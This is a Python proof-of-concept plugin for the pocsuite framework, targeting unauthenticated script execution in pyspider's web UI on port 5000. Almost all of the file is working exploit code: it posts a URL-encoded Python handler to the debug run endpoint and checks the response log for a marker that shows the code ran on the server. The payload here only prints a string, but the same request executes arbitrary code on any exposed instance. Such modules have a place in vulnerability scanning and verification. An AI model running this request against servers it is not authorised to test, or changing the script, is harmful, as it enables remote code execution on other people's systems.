#!/usr/bin/python
# -*- coding: utf-8 -*-
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.request import req
import IPy,re
def check_accurate(ip,port):
    '''
    accurate check
    check if python script can be executed
    '''
    url="http://"+ip+":"+str(port)+"/debug/pyspidervulntest/run"
    headers={"Content-Type": "application/x-www-form-urlencoded"}
    data='''
    webdav_mode=false&script=from+pyspider.libs.base_handler+import+*%0Aclass+Handler(BaseHandler)%3A%0A++++def+on_start(self)%3A%0A++++++++print('pyspidervulnerable')&task=%7B%0A++%22process%22%3A+%7B%0A++++%22callback%22%3A+%22on_start%22%0A++%7D%2C%0A++%22project%22%3A+%22pyspidervulntest%22%2C%0A++%22taskid%22%3A+%22data%3A%2Con_start%22%2C%0A++%22url%22%3A+%22data%3A%2Con_start%22%0A%7D
    '''
    try:
        r=req.post(url=url,data=data,headers=headers,timeout=1)
        if  '"logs": "pyspidervulnerable\\n"' in r.text:
            return True
    except Exception:
        return False
    return False
def poc(url):
    ip = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", url)
    ip = str(IPy.IP(ip[0]))
    if check_accurate(ip, "5000"):
        return True
    else:
        return False

class TestPOC(POCBase):
    name = 'pyspider未授权访问漏洞'
    vulID = '无'
    author = ['sxd']
    vulType = 'Unauthorized access'
    version = '1.0'  # default version: 1.0
    references = ['http://www.0-sec.org/0day/Pyspider/1.html']
    desc = '''
		  pyspider未授权访问
		   '''
    vulDate = '2020-03-31'
    createDate = '2020-03-31'
    updateDate = '2020-03-31'
    appName = 'pyspider'
    appVersion = 'all'
    appPowerLink = ''
    samples = ['IPy',"re"]

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        response = poc(self.url)
        if response:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url + ' pyspider未授权访问漏洞' + ' is exist!'
        return self.parse_output(result)
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output
register(TestPOC)
